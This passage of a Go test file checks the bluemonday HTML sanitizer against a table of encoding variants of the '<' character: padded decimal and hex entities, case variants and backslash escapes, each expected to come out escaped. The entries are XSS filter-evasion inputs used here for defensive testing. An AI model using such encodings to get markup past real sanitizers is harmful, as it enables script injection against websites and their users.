		ExpectedStrict: `&lt;`,
	}, {
		Name:           `Character escape sequences`,
		Value:          `&#0000060;`,
		ExpectedUGC:    `&lt;`,
		ExpectedStrict: `&lt;`,
	}, {
		Name:           `Character escape sequences`,
		Value:          `&#x3c`,
		ExpectedUGC:    `&lt;`,
		ExpectedStrict: `&lt;`,
	}, {
		Name:           `Character escape sequences`,
		Value:          `&#x03c`,
		ExpectedUGC:    `&lt;`,
		ExpectedStrict: `&lt;`,
	}, {
		Name:           `Character escape sequences`,
		Value:          `&#x003c`,
		ExpectedUGC:    `&lt;`,
		ExpectedStrict: `&lt;`,
	}, {
		Name:           `Character escape sequences`,
		Value:          `&#x0003c`,
		ExpectedUGC:    `&lt;`,
		ExpectedStrict: `&lt;`,
	}, {
		Name:           `Character escape sequences`,
		Value:          `&#x00003c`,
		ExpectedUGC:    `&lt;`,
		ExpectedStrict: `&lt;`,
	}, {
		Name:           `Character escape sequences`,
		Value:          `&#x000003c`,
		ExpectedUGC:    `&lt;`,
		ExpectedStrict: `&lt;`,
	}, {
		Name:           `Character escape sequences`,
		Value:          `&#x3c;`,
		ExpectedUGC:    `&lt;`,
		ExpectedStrict: `&lt;`,
	}, {
		Name:           `Character escape sequences`,
		Value:          `&#x03c;`,
		ExpectedUGC:    `&lt;`,
		ExpectedStrict: `&lt;`,
	}, {
		Name:           `Character escape sequences`,
		Value:          `&#x003c;`,
		ExpectedUGC:    `&lt;`,
		ExpectedStrict: `&lt;`,
	}, {
		Name:           `Character escape sequences`,
		Value:          `&#x0003c;`,
		ExpectedUGC:    `&lt;`,
		ExpectedStrict: `&lt;`,
	}, {
		Name:           `Character escape sequences`,
		Value:          `&#x00003c;`,
		ExpectedUGC:    `&lt;`,
		ExpectedStrict: `&lt;`,
	}, {
		Name:           `Character escape sequences`,
		Value:          `&#x000003c;`,
		ExpectedUGC:    `&lt;`,
		ExpectedStrict: `&lt;`,
	}, {
		Name:           `Character escape sequences`,
		Value:          `&#X3c`,
		ExpectedUGC:    `&lt;`,
		ExpectedStrict: `&lt;`,
	}, {
		Name:           `Character escape sequences`,
		Value:          `&#X03c`,
		ExpectedUGC:    `&lt;`,
		ExpectedStrict: `&lt;`,
	}, {
		Name:           `Character escape sequences`,
		Value:          `&#X003c`,
		ExpectedUGC:    `&lt;`,
		ExpectedStrict: `&lt;`,
	}, {
		Name:           `Character escape sequences`,
		Value:          `&#X0003c`,
		ExpectedUGC:    `&lt;`,
		ExpectedStrict: `&lt;`,
	}, {
		Name:           `Character escape sequences`,
		Value:          `&#X00003c`,
		ExpectedUGC:    `&lt;`,
		ExpectedStrict: `&lt;`,
	}, {
		Name:           `Character escape sequences`,
		Value:          `&#X000003c`,
		ExpectedUGC:    `&lt;`,
		ExpectedStrict: `&lt;`,
	}, {
		Name:           `Character escape sequences`,
		Value:          `&#X3c;`,
		ExpectedUGC:    `&lt;`,
		ExpectedStrict: `&lt;`,
	}, {
		Name:           `Character escape sequences`,
		Value:          `&#X03c;`,
		ExpectedUGC:    `&lt;`,
		ExpectedStrict: `&lt;`,
	}, {
		Name:           `Character escape sequences`,
		Value:          `&#X003c;`,
		ExpectedUGC:    `&lt;`,
		ExpectedStrict: `&lt;`,
	}, {
		Name:           `Character escape sequences`,
		Value:          `&#X0003c;`,
		ExpectedUGC:    `&lt;`,
		ExpectedStrict: `&lt;`,
	}, {
		Name:           `Character escape sequences`,
		Value:          `&#X00003c;`,
		ExpectedUGC:    `&lt;`,
		ExpectedStrict: `&lt;`,
	}, {
		Name:           `Character escape sequences`,
		Value:          `&#X000003c;`,
		ExpectedUGC:    `&lt;`,
		ExpectedStrict: `&lt;`,
	}, {
		Name:           `Character escape sequences`,
		Value:          `&#x3C`,
		ExpectedUGC:    `&lt;`,
		ExpectedStrict: `&lt;`,
	}, {
		Name:           `Character escape sequences`,
		Value:          `&#x03C`,
		ExpectedUGC:    `&lt;`,
		ExpectedStrict: `&lt;`,
	}, {
		Name:           `Character escape sequences`,
		Value:          `&#x003C`,
		ExpectedUGC:    `&lt;`,
		ExpectedStrict: `&lt;`,
	}, {
		Name:           `Character escape sequences`,
		Value:          `&#x0003C`,
		ExpectedUGC:    `&lt;`,
		ExpectedStrict: `&lt;`,
	}, {
		Name:           `Character escape sequences`,
		Value:          `&#x00003C`,
		ExpectedUGC:    `&lt;`,
		ExpectedStrict: `&lt;`,
	}, {
		Name:           `Character escape sequences`,
		Value:          `&#x000003C`,
		ExpectedUGC:    `&lt;`,
		ExpectedStrict: `&lt;`,
	}, {
		Name:           `Character escape sequences`,
		Value:          `&#x3C;`,
		ExpectedUGC:    `&lt;`,
		ExpectedStrict: `&lt;`,
	}, {
		Name:           `Character escape sequences`,
		Value:          `&#x03C;`,
		ExpectedUGC:    `&lt;`,
		ExpectedStrict: `&lt;`,
	}, {
		Name:           `Character escape sequences`,
		Value:          `&#x003C;`,
		ExpectedUGC:    `&lt;`,
		ExpectedStrict: `&lt;`,
	}, {
		Name:           `Character escape sequences`,
		Value:          `&#x0003C;`,
		ExpectedUGC:    `&lt;`,
		ExpectedStrict: `&lt;`,
	}, {
		Name:           `Character escape sequences`,
		Value:          `&#x00003C;`,
		ExpectedUGC:    `&lt;`,
		ExpectedStrict: `&lt;`,
	}, {
		Name:           `Character escape sequences`,
		Value:          `&#x000003C;`,
		ExpectedUGC:    `&lt;`,
		ExpectedStrict: `&lt;`,
	}, {
		Name:           `Character escape sequences`,
		Value:          `&#X3C`,
		ExpectedUGC:    `&lt;`,
		ExpectedStrict: `&lt;`,
	}, {
		Name:           `Character escape sequences`,
		Value:          `&#X03C`,
		ExpectedUGC:    `&lt;`,
		ExpectedStrict: `&lt;`,
	}, {
		Name:           `Character escape sequences`,
		Value:          `&#X003C`,
		ExpectedUGC:    `&lt;`,
		ExpectedStrict: `&lt;`,
	}, {
		Name:           `Character escape sequences`,
		Value:          `&#X0003C`,
		ExpectedUGC:    `&lt;`,
		ExpectedStrict: `&lt;`,
	}, {
		Name:           `Character escape sequences`,
		Value:          `&#X00003C`,
		ExpectedUGC:    `&lt;`,
		ExpectedStrict: `&lt;`,
	}, {
		Name:           `Character escape sequences`,
		Value:          `&#X000003C`,
		ExpectedUGC:    `&lt;`,
		ExpectedStrict: `&lt;`,
	}, {
		Name:           `Character escape sequences`,
		Value:          `&#X3C;`,
		ExpectedUGC:    `&lt;`,
		ExpectedStrict: `&lt;`,
	}, {
		Name:           `Character escape sequences`,
		Value:          `&#X03C;`,
		ExpectedUGC:    `&lt;`,
		ExpectedStrict: `&lt;`,
	}, {
		Name:           `Character escape sequences`,
		Value:          `&#X003C;`,
		ExpectedUGC:    `&lt;`,
		ExpectedStrict: `&lt;`,
	}, {
		Name:           `Character escape sequences`,
		Value:          `&#X0003C;`,
		ExpectedUGC:    `&lt;`,
		ExpectedStrict: `&lt;`,
	}, {
		Name:           `Character escape sequences`,
		Value:          `&#X00003C;`,
		ExpectedUGC:    `&lt;`,
		ExpectedStrict: `&lt;`,
	}, {
		Name:           `Character escape sequences`,
		Value:          `&#X000003C;`,
		ExpectedUGC:    `&lt;`,
		ExpectedStrict: `&lt;`,
	}, {
		Name:           `Character escape sequences`,
		Value:          `\x3c`,
		ExpectedUGC:    "\\x3c",
		ExpectedStrict: "\\x3c",
	}, {
		Name:           `Character escape sequences`,
		Value:          `\x3C`,
		ExpectedUGC:    "\\x3C",
		ExpectedStrict: "\\x3C",
	}, {
		Name:           `Character escape sequences`,
		Value:          `\u003c`,
		ExpectedUGC:    "\\u003c",
		ExpectedStrict: "\\u003c",
	}, {
		Name:           `Character escape sequences`,
		Value:          `\u003C`,
		ExpectedUGC:    "\\u003C",
		ExpectedStrict: "\\u003C",
	},
}

func TestXSS(t *testing.T) {
	p := bluemonday.UGCPolicy()
	for _, v := range vulnerabilities {
		assert.Equal(t, v.ExpectedUGC, p.Sanitize(v.Value))
	}

	p = bluemonday.StrictPolicy()
	for _, v := range vulnerabilities {
		assert.Equal(t, v.ExpectedStrict, p.Sanitize(v.Value))
	}
}
